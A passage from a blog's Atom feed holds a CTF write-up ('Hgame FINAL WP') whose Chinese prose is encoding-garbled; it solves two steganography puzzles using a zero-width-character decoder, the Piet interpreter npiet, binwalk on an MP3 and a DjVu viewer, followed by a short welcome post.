    <content type="html"><![CDATA[<h1 id="hgame-final-wp"><a class="markdownIt-Anchor" href="#hgame-final-wp">#</a> Hgame FINAL WP</h1><h3 id="author-fc04db"><a class="markdownIt-Anchor" href="#author-fc04db">#</a> author: Fc04dB</h3><h4 id="1çœ‹ä¸è§çš„å­—"><a class="markdownIt-Anchor" href="#1çœ‹ä¸è§çš„å­—">#</a> 1. çœ‹ä¸è§çš„å­—</h4><p>é¢˜ç›®æç¤º npm install zero-width-lib , ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œæ˜¯é›¶å®½å­—ç¬¦éšè—æ–‡æœ¬åŠ å¯†ï¼ˆnpm æ²¡æœ‰ç ”ç©¶ï¼Œæœ€åå‘ç°ä¹Ÿæ²¡ç”¨åˆ°ï¼‰ï¼Œç¿»äº†å¾ˆå¤šæ–‡ç« ï¼Œæ‰¾åˆ°ä¸€ä¸ªåœ¨çº¿è§£å¯†çš„ç½‘ç«™:</p><pre><code>https://yuanfux.github.io/zero-width-web/</code></pre><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png" alt="image-5.png"></p><p>ç›´æ¥å¾—åˆ° flag</p><p>é¡ºä¾¿è´´ä¸€å¼ å…¶ä»–äººå†™çš„è„šæœ¬</p><pre><code>import * as z from 'zero-width-lib';// è¿™æ˜¯è¦è§£å¯†çš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«é›¶å®½åº¦å­—ç¬¦const encodedString = 'h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFEFF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello';// ä½¿ç”¨zero-width-libçš„decodeæ–¹æ³•æ¥è§£å¯†å­—ç¬¦ä¸²const decoded = z.decode(encodedString);console.log(decoded);</code></pre><h4 id="2é€®è™¾æˆ·"><a class="markdownIt-Anchor" href="#2é€®è™¾æˆ·">#</a> 2. é€®è™¾æˆ·</h4><p>é™„ä»¶ä¸€ä¸ª dmg æ–‡ä»¶æ˜¯ moc ç³»ç»Ÿç£ç›˜æ–‡ä»¶ï¼Œ7z ç›´æ¥æå–ï¼Œä¸€ä¸ªéœ€è¦å¯†ç çš„å‹ç¼©åŒ…ï¼Œä¸€ä¸ª png æ–‡ä»¶ï¼Œå¯†ç åº”è¯¥å°±åœ¨ png æ–‡ä»¶é‡Œï¼Œç„¶åç”¨ binwalk,foremost,stegsolve,zstegï¼Œå¥½å¤šå·¥å…·éƒ½æ‰¾ä¸åˆ°éšå†™å†…å®¹ï¼Œåæ¥åœ¨å­¦é•¿çš„æç¤ºä¸‹æ˜¯ piet ç¼–ç¨‹è¯­è¨€ï¼Œç„¶åä¸‹è½½ npiet æ‰§è¡Œæ–‡ä»¶å¾—åˆ°å¯†ç </p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png" alt="image-1.png"></p><p>æ‰“å¼€ 7z æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªé€®è™¾æˆ·æ­Œæ›²ï¼Œå°è¯• MP3 éšå†™çš„è§£é¢˜æ–¹æ³•ï¼Œä¸€æ— æ‰€è·ï¼Œå†æ¬¡è¯·æ•™å­¦é•¿ï¼Œ<br>ä¿¡æ¯åœ¨æ­Œè¯é‡Œï¼Œæƒ³ç€æŠŠæ­Œè¯æå–å‡ºæ¥ï¼Œæœ€ååˆ©ç”¨ elisa æ’­æ”¾å™¨æ‰¾åˆ° passward</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png" alt="image-2.png"></p><pre><code>q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT</code></pre><p>è¯¶ï¼Ÿé•¿å¾—ä¹Ÿä¸åƒ flagï¼Œç„¶åå­¦é•¿æé†’æœ‰ä¸€ä¸ª zip æ–‡ä»¶æ²¡æ‰¾åˆ°ï¼Œç”¨ binwalk å¤„ç†é‚£ä¸ª MP3 æ–‡ä»¶ï¼Œæå–åˆ° zip æ–‡ä»¶</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png" alt="image-3.png"></p><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ª jdvu æ–‡ä»¶ï¼Œè®°äº‹æœ¬æ‰“ä¸å¼€ï¼Œç™¾åº¦ï¼Œè¦ä¸‹è½½ windjviewï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ° flag</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png" alt="image-4.png"></p><pre><code>Hgame&#123;d3j45_i_kn0w&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hgame-final-wp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#hgame-final-wp&quot;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&quot;author-fc04db&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Welcome to Fc04dB&#39;s BLOG</title>
    <link href="http://example.com/2024/04/03/My-New-Post/"/>
    <id>http://example.com/2024/04/03/My-New-Post/</id>
    <published>2024-04-03T12:29:21.000Z</published>
    <updated>2024-04-06T05:15:32.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WELCOME"><a href="#WELCOME" class="headerlink" title="WELCOME!!!!!"></a>WELCOME!!!!!</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WELCOME&quot;&gt;&lt;a href=&quot;#WELCOME&quot; class=&quot;headerlink&quot; title=&quot;WELCOME!!!!!&quot;&gt;&lt;/a&gt;WELCOME!!!!!&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
